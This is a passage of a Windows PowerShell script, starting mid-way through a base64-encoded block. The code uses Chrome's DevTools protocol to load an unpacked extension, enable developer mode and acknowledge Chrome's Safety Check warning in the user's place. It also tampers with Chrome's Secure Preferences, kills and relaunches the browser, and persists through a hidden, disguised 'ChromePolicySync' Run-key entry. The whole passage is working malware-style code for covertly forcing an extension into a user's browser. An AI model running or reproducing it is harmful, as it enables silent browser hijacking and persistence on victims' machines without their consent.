vYy5JZCl8UE9SVDokcG9ydHwiDQoNCiR3c1VybCA9ICRudWxsDQpmb3IgKCRpID0gMDsgJGkgLWx0IDI1OyAkaSsrKSB7DQogICAgdHJ5IHsNCiAgICAgICAgJHZlciA9IChJbnZva2UtV2ViUmVxdWVzdCAtVXJpICJodHRwOi8vMTI3LjAuMC4xOiRwb3J0L2pzb24vdmVyc2lvbiIgLVVzZUJhc2ljUGFyc2luZyAtVGltZW91dFNlYyAyKS5Db250ZW50DQogICAgICAgIGlmICgkdmVyIC1tYXRjaCAnIndlYlNvY2tldERlYnVnZ2VyVXJsIlxzKjpccyoiKFteIl0rKSInKSB7ICR3c1VybCA9ICRNYXRjaGVzWzFdOyBicmVhayB9DQogICAgfSBjYXRjaCB7IFN0YXJ0LVNsZWVwIDEgfQ0KfQ0KaWYgKC1ub3QgJHdzVXJsKSB7IFdMb2cgIlBPUlRfVElNRU9VVHwiOyBpZiAoLW5vdCAkcHJvYy5IYXNFeGl0ZWQpIHsgJHByb2MgfCBTdG9wLVByb2Nlc3MgLUZvcmNlIH07IGNtZCAvYyAicm1kaXIgYCIkanVuY3Rpb25gIiIgMj4kbnVsbDsgV3JpdGUtT3V0cHV0ICRsb2c7IGV4aXQgMSB9DQpXTG9nICJXUzpva3wiDQoNCkFkZC1UeXBlIC1SZWZlcmVuY2VkQXNzZW1ibGllcyBAKCdTeXN0ZW0uQ29yZScpIC1UeXBlRGVmaW5pdGlvbiBAJw0KdXNpbmcgU3lzdGVtOyB1c2luZyBTeXN0ZW0uTmV0LldlYlNvY2tldHM7IHVzaW5nIFN5c3RlbS5UZXh0OyB1c2luZyBTeXN0ZW0uVGV4dC5SZWd1bGFyRXhwcmVzc2lvbnM7IHVzaW5nIFN5c3RlbS5UaHJlYWRpbmc7DQpwdWJsaWMgY2xhc3MgQ2RwUmVmIHsNCiAgICBzdGF0aWMgaW50IF9pZCA9IDEwOyBzdGF0aWMgQ2xpZW50V2ViU29ja2V0IF93czsNCiAgICBzdGF0aWMgc3RyaW5nIFJlYWRNc2coKSB7DQogICAgICAgIHZhciBidWYgPSBuZXcgYnl0ZVsyNjIxNDRdOyB2YXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcigpOw0KICAgICAgICB3aGlsZSAodHJ1ZSkgew0KICAgICAgICAgICAgdmFyIHIgPSBfd3MuUmVjZWl2ZUFzeW5jKG5ldyBBcnJheVNlZ21lbnQ8Ynl0ZT4oYnVmKSwgQ2FuY2VsbGF0aW9uVG9rZW4uTm9uZSkuR2V0QXdhaXRlcigpLkdldFJlc3VsdCgpOw0KICAgICAgICAgICAgc2IuQXBwZW5kKEVuY29kaW5nLlVURjguR2V0U3RyaW5nKGJ1ZiwgMCwgci5Db3VudCkpOw0KICAgICAgICAgICAgaWYgKHIuRW5kT2ZNZXNzYWdlKSBicmVhazsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gc2IuVG9TdHJpbmcoKTsNCiAgICB9DQogICAgc3RhdGljIHZvaWQgU2VuZE9ubHkoc3RyaW5nIGpzb24pIHsNCiAgICAgICAgdmFyIGIgPSBFbmNvZGluZy5VVEY4LkdldEJ5dGVzKGpzb24pOw0KICAgICAgICBfd3MuU2VuZEFzeW5jKG5ldyBBcnJheVNlZ21lbnQ8Ynl0ZT4oYiksIFdlYlNvY2tldE1lc3NhZ2VUeXBlLlRleHQsIHRydWUsIENhbmNlbGxhdGlvblRva2VuLk5vbmUpLkdldEF3YWl0ZXIoKS5HZXRSZXN1bHQoKTsNCiAgICB9DQogICAgc3RhdGljIHN0cmluZyBXYWl0Rm9ySWQoc3RyaW5nIHdhbnRJZCwgaW50IHRyaWVzKSB7DQogICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgdHJpZXM7IGkrKykgew0KICAgICAgICAgICAgc3RyaW5nIG1zZyA9IFJlYWRNc2coKTsNCiAgICAgICAgICAgIGlmIChtc2cuQ29udGFpbnMoIlwiaWRcIjoiICsgd2FudElkKSkgcmV0dXJuIG1zZzsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gIiI7DQogICAgfQ0KICAgIHN0YXRpYyBzdHJpbmcgRXh0cmFjdChzdHJpbmcganNvbiwgc3RyaW5nIGtleSkgew0KICAgICAgICB2YXIgbSA9IFJlZ2V4Lk1hdGNoKGpzb24sICJcIiIgKyBrZXkgKyAiXCJcXHMqOlxccypcIihbXlwiXSspXCIiKTsNCiAgICAgICAgcmV0dXJuIG0uU3VjY2VzcyA/IG0uR3JvdXBzWzFdLlZhbHVlIDogbnVsbDsNCiAgICB9DQogICAgc3RhdGljIHN0cmluZyBFdmFsSW5TZXNzaW9uKHN0cmluZyBzZXNzaW9uSWQsIHN0cmluZyBqcykgew0KICAgICAgICBqcyA9IGpzLlJlcGxhY2UoIlxcIiwgIlxcXFwiKS5SZXBsYWNlKCJcIiIsICJcXFwiIik7DQogICAgICAgIGludCBlSWQgPSBfaWQrKzsNCiAgICAgICAgU2VuZE9ubHkoIntcImlkXCI6IiArIGVJZCArICIsXCJtZXRob2RcIjpcIlJ1bnRpbWUuZXZhbHVhdGVcIixcInNlc3Npb25JZFwiOlwiIiArIHNlc3Npb25JZCArICJcIixcInBhcmFtc1wiOntcImV4cHJlc3Npb25cIjpcIiIgKyBqcyArICJcIixcImF3YWl0UHJvbWlzZVwiOnRydWUsXCJyZXR1cm5CeVZhbHVlXCI6dHJ1ZX19Iik7DQogICAgICAgIHN0cmluZyByZXNwID0gV2FpdEZvcklkKGVJZC5Ub1N0cmluZygpLCA1MCk7DQogICAgICAgIHJldHVybiByZXNwLkxlbmd0aCA+IDIwMCA/IHJlc3AuU3Vic3RyaW5nKDAsIDIwMCkgOiByZXNwOw0KICAgIH0NCiAgICBzdGF0aWMgc3RyaW5nIEVuYWJsZUpzKHN0cmluZyBleHRJZCkgew0KICAgICAgICByZXR1cm4gIihhc3luYygpPT57Y29uc3QgaWQ9JyIgKyBleHRJZCArICInO2NvbnN0IE9GRj00O2NvbnN0IHI9W107dHJ5e2ZvcihsZXQgdz0wO3c8MjQ7dysrKXtmb3IoY29uc3QgZSBvZiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdleHRlbnNpb25zLWl0ZW0nKSl7aWYoZS5pZD09PWlkKXtyLnB1c2goJ0ZPVU5EJyk7dz05OTticmVhazt9fWlmKHc8MjQpYXdhaXQgbmV3IFByb21pc2UoeD0+c2V0VGltZW91dCh4LDUwMCkpO31jb25zdCBtPWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2V4dGVuc2lvbnMtbWFuYWdlcicpO2NvbnN0IGQ9bSYmbS5kZWxlZ2F0ZTtpZihkJiZ0eXBlb2YgZC5zZXRJdGVtU2FmZXR5Q2hlY2tXYXJuaW5nQWNrbm93bGVkZ2VkPT09J2Z1bmN0aW9uJyl7dHJ5e2F3YWl0IGQuc2V0SXRlbVNhZmV0eUNoZWNrV2FybmluZ0Fja25vd2xlZGdlZChpZCxPRkYpO3IucHVzaCgnQUNLJyk7fWNhdGNoKF8pe3IucHVzaCgnQUNLX0VSUicpO319Y29uc3QgaXRlbT1kb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZCl8fFsuLi5kb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdleHRlbnNpb25zLWl0ZW0nKV0uZmluZChlPT5lLmlkPT09aWQpO2lmKGl0ZW0mJml0ZW0uc2hhZG93Um9vdCl7Y29uc3QgdD1pdGVtLnNoYWRvd1Jvb3QucXVlcnlTZWxlY3RvcignI2VuYWJsZVRvZ2dsZScpO2lmKHQmJiF0LmNoZWNrZWQmJiF0LmRpc2FibGVkKXt0LmNsaWNrKCk7ci5wdXNoKCdDTElDSycpO31lbHNlIGlmKHQmJnQuY2hlY2tlZClyLnB1c2goJ09OJyk7fWlmKCFyLmluY2x1ZGVzKCdDTElDSycpJiYhci5pbmNsdWRlcygnT04nKSYmZCYmdHlwZW9mIGQuc2V0SXRlbUVuYWJsZWQ9PT0nZnVuY3Rpb24nKXt0cnl7YXdhaXQgZC5zZXRJdGVtRW5hYmxlZChpZCx0cnVlKTtyLnB1c2goJ0VOJyk7fWNhdGNoKF8pe3IucHVzaCgnRU5fRVJSJyk7fX1yZXR1cm4gci5sZW5ndGg/ci5qb2luKCcrJyk6J05PX0FQSSc7fWNhdGNoKGUpe3JldHVybiAnRVJSOicrZTt9fSkoKSI7DQogICAgfQ0KICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFJ1bihzdHJpbmcgd3NVcmwsIHN0cmluZyBleHRJZCwgc3RyaW5nIGV4dFBhdGgpIHsNCiAgICAgICAgc3RyaW5nIGxvZyA9ICIiOw0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgX3dzID0gbmV3IENsaWVudFdlYlNvY2tldCgpOw0KICAgICAgICAgICAgX3dzLkNvbm5lY3RBc3luYyhuZXcgVXJpKHdzVXJsKSwgQ2FuY2VsbGF0aW9uVG9rZW4uTm9uZSkuV2FpdCgxNTAwMCk7DQogICAgICAgICAgICBsb2cgKz0gIkNPTk5FQ1Q6b2t8IjsNCiAgICAgICAgICAgIGlmICghc3RyaW5nLklzTnVsbE9yRW1wdHkoZXh0UGF0aCkpIHsNCiAgICAgICAgICAgICAgICBzdHJpbmcgZXNjUGF0aCA9IGV4dFBhdGguUmVwbGFjZSgiXFwiLCAiXFxcXCIpLlJlcGxhY2UoIlwiIiwgIlxcXCIiKTsNCiAgICAgICAgICAgICAgICBpbnQgbElkID0gX2lkKys7DQogICAgICAgICAgICAgICAgU2VuZE9ubHkoIntcImlkXCI6IiArIGxJZCArICIsXCJtZXRob2RcIjpcIkV4dGVuc2lvbnMubG9hZFVucGFja2VkXCIsXCJwYXJhbXNcIjp7XCJwYXRoXCI6XCIiICsgZXNjUGF0aCArICJcIn19Iik7DQogICAgICAgICAgICAgICAgc3RyaW5nIGxvYWRSZXNwID0gV2FpdEZvcklkKGxJZC5Ub1N0cmluZygpLCA1MCk7DQogICAgICAgICAgICAgICAgbG9nICs9ICJFWFRfQ01EOiIgKyAobG9hZFJlc3AuTGVuZ3RoID4gMTIwID8gbG9hZFJlc3AuU3Vic3RyaW5nKDAsIDEyMCkgOiBsb2FkUmVzcCkgKyAifCI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpbnQgY0lkID0gX2lkKys7DQogICAgICAgICAgICBTZW5kT25seSgie1wiaWRcIjoiICsgY0lkICsgIixcIm1ldGhvZFwiOlwiVGFyZ2V0LmNyZWF0ZVRhcmdldFwiLFwicGFyYW1zXCI6e1widXJsXCI6XCJjaHJvbWU6Ly9leHRlbnNpb25zXCJ9fSIpOw0KICAgICAgICAgICAgc3RyaW5nIHRhcmdldElkID0gRXh0cmFjdChXYWl0Rm9ySWQoY0lkLlRvU3RyaW5nKCksIDI1KSwgInRhcmdldElkIik7DQogICAgICAgICAgICBpZiAodGFyZ2V0SWQgPT0gbnVsbCkgcmV0dXJuIGxvZyArICJDUkVBVEVfRkFJTHwiOw0KICAgICAgICAgICAgaW50IGFJZCA9IF9pZCsrOw0KICAgICAgICAgICAgU2VuZE9ubHkoIntcImlkXCI6IiArIGFJZCArICIsXCJtZXRob2RcIjpcIlRhcmdldC5hdHRhY2hUb1RhcmdldFwiLFwicGFyYW1zXCI6e1widGFyZ2V0SWRcIjpcIiIgKyB0YXJnZXRJZCArICJcIixcImZsYXR0ZW5cIjp0cnVlfX0iKTsNCiAgICAgICAgICAgIHN0cmluZyBzZXNzaW9uSWQgPSBFeHRyYWN0KFdhaXRGb3JJZChhSWQuVG9TdHJpbmcoKSwgMjUpLCAic2Vzc2lvbklkIik7DQogICAgICAgICAgICBpZiAoc2Vzc2lvbklkID09IG51bGwpIHJldHVybiBsb2cgKyAiQVRUQUNIX0ZBSUx8IjsNCiAgICAgICAgICAgIFRocmVhZC5TbGVlcCg1MDAwKTsNCiAgICAgICAgICAgIGxvZyArPSAiREVWTU9ERToiICsgRXZhbEluU2Vzc2lvbihzZXNzaW9uSWQsICIoZnVuY3Rpb24oKXt0cnl7Y29uc3QgbT1kb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdleHRlbnNpb25zLW1hbmFnZXInKTtpZihtJiZtLmRlbGVnYXRlKXttLmRlbGVnYXRlLnNldFByb2ZpbGVJbkRldk1vZGUodHJ1ZSk7cmV0dXJuICdPSyc7fXJldHVybiAnTk9fTUdSJzt9Y2F0Y2goZSl7cmV0dXJuICdFUlI6JytlO319KSgpIikgKyAifCI7DQogICAgICAgICAgICBUaHJlYWQuU2xlZXAoMjAwMCk7DQogICAgICAgICAgICBsb2cgKz0gIkVWQUwxOiIgKyBFdmFsSW5TZXNzaW9uKHNlc3Npb25JZCwgRW5hYmxlSnMoZXh0SWQpKSArICJ8IjsNCiAgICAgICAgICAgIFRocmVhZC5TbGVlcCgxMDAwMCk7DQogICAgICAgICAgICBsb2cgKz0gIkVWQUwyOiIgKyBFdmFsSW5TZXNzaW9uKHNlc3Npb25JZCwgRW5hYmxlSnMoZXh0SWQpKSArICJ8IjsNCiAgICAgICAgICAgIGxvZyArPSAiU1RBVEU6IiArIEV2YWxJblNlc3Npb24oc2Vzc2lvbklkLCAiKGZ1bmN0aW9uKCl7Y29uc3QgaWQ9JyIgKyBleHRJZCArICInO3JldHVybiBuZXcgUHJvbWlzZShvaz0+Y2hyb21lLm1hbmFnZW1lbnQuZ2V0KGlkLGk9Pm9rKEpTT04uc3RyaW5naWZ5KHtlbmFibGVkOmkmJmkuZW5hYmxlZCxkaXNhYmxlZFJlYXNvbjppJiZpLmRpc2FibGVkUmVhc29ufSkpKSk7fSkoKSIpICsgInwiOw0KICAgICAgICAgICAgaW50IHhJZCA9IF9pZCsrOw0KICAgICAgICAgICAgU2VuZE9ubHkoIntcImlkXCI6IiArIHhJZCArICIsXCJtZXRob2RcIjpcIkJyb3dzZXIuY2xvc2VcIn0iKTsNCiAgICAgICAgICAgIFRocmVhZC5TbGVlcCgzMDAwKTsNCiAgICAgICAgICAgIGxvZyArPSAiQ0xPU0U6b2t8IjsNCiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGV4KSB7IGxvZyArPSAiRVJSOiIgKyBleC5NZXNzYWdlICsgInwiOyB9DQogICAgICAgIGZpbmFsbHkgeyB0cnkgeyBpZiAoX3dzICE9IG51bGwpIF93cy5EaXNwb3NlKCk7IH0gY2F0Y2gge30gfQ0KICAgICAgICByZXR1cm4gbG9nOw0KICAgIH0NCn0NCidAIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQoNCldMb2cgKFtDZHBSZWZdOjpSdW4oJHdzVXJsLCAkRXh0SWQsICRFeHRQYXRoKSkNCg0KaWYgKC1ub3QgJHByb2MuSGFzRXhpdGVkKSB7ICRwcm9jIHwgU3RvcC1Qcm9jZXNzIC1Gb3JjZSB9DQpTdGFydC1TbGVlcCAyDQpjbWQgL2MgInJtZGlyIGAiJGp1bmN0aW9uYCIiIDI+JG51bGwNCldyaXRlLU91dHB1dCAkbG9nDQo='))

$refresherScript = @"
Start-Sleep 5
`$persistDir = "$persistDir"
`$extId = Get-Content "`$persistDir\ext_id.txt" -ErrorAction SilentlyContinue
if (-not `$extId) { exit }
`$chromeExe = "C:\Program Files\Google\Chrome\Application\chrome.exe"
if (-not (Test-Path `$chromeExe)) { `$chromeExe = "`${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe" }
`$chromeDir = Split-Path `$chromeExe -Parent
`$secPrefs = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Secure Preferences"
`$extDir = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\`$extId\1.0_0"
`$extSrc = "`$persistDir\extension"
`$localUrl = "file:///`$(Join-Path `$persistDir `"update.xml`" -replace '\\','/')"
`$crxPath = "`$persistDir\extension.crx"

Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 2
cmd /c "reg delete `"HKCU\Software\Google\Chrome\Extensions\`$extId`" /f" >nul 2>&1
New-Item -Path `$extDir -ItemType Directory -Force | Out-Null
Copy-Item "`$extSrc\manifest.json" `$extDir -Force
Copy-Item "`$extSrc\sw.js" `$extDir -Force
if (Test-Path `$secPrefs) {
    & powershell -NoProfile -ExecutionPolicy Bypass -File "`$persistDir\enable.ps1" -ExtId `$extId -ChromeDir `$chromeDir -SecPrefsPath `$secPrefs
}
`$userDataDir = "`$env:LOCALAPPDATA\Google\Chrome\User Data"
`$content = if (Test-Path `$secPrefs) { Get-Content `$secPrefs -Raw } else { '' }
`$needsCdp = (`$content -match '"disable_reasons":\[256\]') -or (`$content -notmatch '"state":1')
if (`$needsCdp -and (Test-Path "`$persistDir\cdp_enable.ps1")) {
    & powershell -NoProfile -ExecutionPolicy Bypass -File "`$persistDir\cdp_enable.ps1" -ChromeExe `$chromeExe -ExtId `$extId -UserDataDir `$userDataDir -ExtPath `$extSrc
}
Start-Process `$chromeExe
"@

$refresherPath = Join-Path $persistDir "refresher.ps1"
Set-Content $refresherPath $refresherScript -Encoding UTF8

# Persist via HKCU Run key (user-only, no admin)
$taskAction = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$refresherPath`""
$taskName = "ChromePolicySync"
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $taskName -Value $taskAction
Log "  HKCU Run key $taskName created"

Log "=========================================="
Log "DONE v10.5 - Unpacked + HMAC + CDP"
Log "  Extension ID: $extId"
Log "  Persist dir: $persistDir"
Log "  Refresher: $refresherPath (runs at logon)"
Log "  Method: CDP loadUnpacked + HMAC + Safety Check bypass + Run refresher"
Log "=========================================="
